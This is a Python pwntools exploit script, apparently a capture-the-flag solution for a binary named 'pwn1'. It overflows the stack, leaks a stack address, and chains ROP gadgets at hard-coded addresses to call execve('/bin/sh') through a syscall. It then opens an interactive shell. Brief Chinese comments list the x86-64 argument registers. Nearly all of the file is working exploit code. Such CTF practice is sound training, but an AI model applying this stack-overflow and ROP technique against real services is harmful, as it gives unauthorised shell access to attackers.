from pwn import *

p=process('./pwn1')
#p=remote('node4.buuoj.cn',29476)
#context.log_level='debug'

vlun_addr=0x00000000004004ED
#gdb.attach(p)
#p=gdb.debug('./pwn','break vuln')
payload=b'/bin/sh\x00'*2+p64(vlun_addr)+b'aaaaaaaa'     #8byte   #*2+p64(vlu_addr)
p.send(payload)


binsh_addr = u64(p.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00'))-0x128
print(hex(binsh_addr))


pop_rsi=0x00000000004005a1 # : pop rsi ; pop r15 ; ret
pop_rbx_rbp_r12_r13_14_15=0x000000000040059A
ret=0x00000000004005A4 
mov_rdx=0x0000000000400580 
pop_rdi_addr=  0x00000000004005a3
mov_rax_ret=0x00000000004004E2   #              mov     rax, 3Bh ; ';'
syscall=0x0000000000400501
pop_r15_ret=0x00000000004005A2 
payload2=b'/bin/sh\x00'+p64(pop_r15_ret)+p64(pop_rbx_rbp_r12_r13_14_15)+p64(0)+p64(1)+p64(binsh_addr+0x8)+p64(0)*3+p64(mov_rdx)+p64(pop_rdi_addr)+p64(binsh_addr)+p64(mov_rax_ret)+p64(syscall)
#RDI：第一个参数
#RSI：第二个参数
#RDX：第三个参数
#RCX：第四个参数
#R8：第五个参数
#R9：第六个参数
#RAX：函数返回值
#RBP：基址指针，用于保存栈帧基址
#RSP：栈指针，用于指向当前栈顶
p.send(payload2)


#pause()
p.interactive()





